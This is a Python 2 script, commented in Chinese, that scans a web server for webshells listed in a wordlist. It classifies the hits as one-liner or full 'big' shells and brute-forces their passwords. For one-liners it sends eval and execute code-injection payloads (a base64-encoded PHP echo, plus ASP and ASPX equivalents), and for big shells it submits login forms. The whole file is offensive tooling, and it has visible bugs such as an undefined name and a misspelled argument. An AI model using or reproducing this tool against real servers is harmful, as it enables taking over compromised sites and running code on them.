#!/usr/bin/env python
#coding:utf-8
import re
import os,httplib
import sys
import time
import requests
import gzip,StringIO
from bs4 import BeautifulSoup


url_list_yijuhua = []  #存储一句话类型木马
url_list_dama = []     #存储大马

#判断木马类型
def check_type(vulurl,ext):
    html = requests.get(vulurl).content
    soup = BeautifulSoup(html,"html.parser")
    if html=="":
        url_list_yijuhua.append(ext)    
    elif soup.find(type="password"):
        url_list_dama.append(ext)
    else:
        pass                    

#根据字典检测疑似webshell文件
def spider_shell(url):
    print "开始扫描webshell....."
    file = open("webshell.txt")
    while 1:
        try:
            ext = file.readline()
            ext = ext.strip('\n')
            if ext is not "":
                print "testing------->%s"%ext
            VulUrl = url+"/"+ext
            status = requests.get(VulUrl).status_code
            if status == 200:
                if ext is not "":
                    print "发现疑似webshell文件--%s" % ext
                    check_type(VulUrl,ext)    
            if not ext:
                break    
        except:
            pass
#获取post数据包
def get_post_data(url,soup,password):
    p_list = [] #存放post参数
    v_list = [] #存放post参数值
    for link in soup.find_all('input'):
        if link.get('name') is not None:
            a = link.get('name')
            if link.get('value')!=None:
                b = link.get('value')
                v_list.append(b)
            p_list.append(a)    
    v_list.insert(0,password)
    post_data = dict(zip(p_list,v_list)) #组合成dic
    return post_data    

#破解大马文件
def brute_dama_pass(url,extlist=None):     #读取本地密码文件
    for ext in extlist:
        try:
            passwd = open("pass.txt") 
            target = url+"/"+ext
            print "开始破解可疑大马文件---%s"%target
            html = requests.get(target).content
            soup = BeautifulSoup(html,"html.parser")
            s = requests.Session()
            for p in passwd.readlines():
                p = p.strip("\n")
                try:
                    post_data = get_post_data(target,soup,p)
                    print "testing-------->%s"%p
                    res1 = s.post(target,data=post_data)
                    res2 = s.post(target)
                    if res1.cookies != res2.cookies:  #通过登陆前后的cookies值判断是否登陆成功
                        print "Pass Found***********************%s"%p
                        break
                    else:
                        pass     
                except Exception, e:
                    raise e

        except Exception, e:
            raise e
#判断一句话木马后缀类型
def check_ext_type(ext):
    extion = ext.split(".").pop()
    if extion == "":
        extion = asp
    if extion == "asp":
        params = "=execute(\"response.clear:response.write(\"\"jinlaile\"`\"):response.end\")"
    elif extion=="php":
        params = "=@eval(base64_decode($_POST[z0]));&z0=ZWNobygiamlubGFpbGUiKTtkaWUoKTs="
    else:
        params = "=Response.Clear();Response.Write(\"jinlaile\");"
    return params    

#破解一句话木马文件
def brute_yijuhua_pass(url,extlist=None):
    for ext in extlist:
        try:
            passwd = open("pass.txt")
            target = url+"/"+ext
            headers={"Host": url,\
                     "User-Agent": "Mozilla/5.0",\
                     "Content-Type": "application/x-www-form-urlencoded",\
                     "Referer": "http://"+url
                    }
            params=check_ext_type(ext)
            print "开始破解可疑一句话木马------>%s"%target
            conn = httplib.HTTPConnection(url)
            for p in passwd:
                try:
                    p = p.strip("\n")
                    print "testing------->%s"%p
                    par = p+params
                    conn.request(method="POST",url="http://"+target,body=par,headers=headers)    
                    response = conn.getresponse()
                    if ('content-encoding','gzip') in response.getheaders():
                        compressedstream = StringIO.StringIO(response.read())
                        gzipper = gzip.GzipFile(fileob=compressedstream)
                        data = gzipper.read()
                    else:
                        data = response.read()
                    if (data.find("jinlaile")>=0):
                        print "Pass Found************************%s"%p
                        break        
                except Exception, e:
                    raise e
                    pass 
        except Exception, e:
            raise e
            pass

if __name__=="__main__":
    url = "http://127.0.0.1"
    spider_shell(url)
    if url_list_dama != "":
        print "============================================================="
        print "大马列表:%s"%url_list_dama
        brute_dama_pass(url,url_list_dama)
    else:
        pass
    if url_list_yijuhua != "":
        print "============================================================="
        print "一句话木马列表:%s"%url_list_yijuhua
        url = url.split("//").pop()
        brute_yijuhua_pass(url,url_list_yijuhua)
    else:
        pass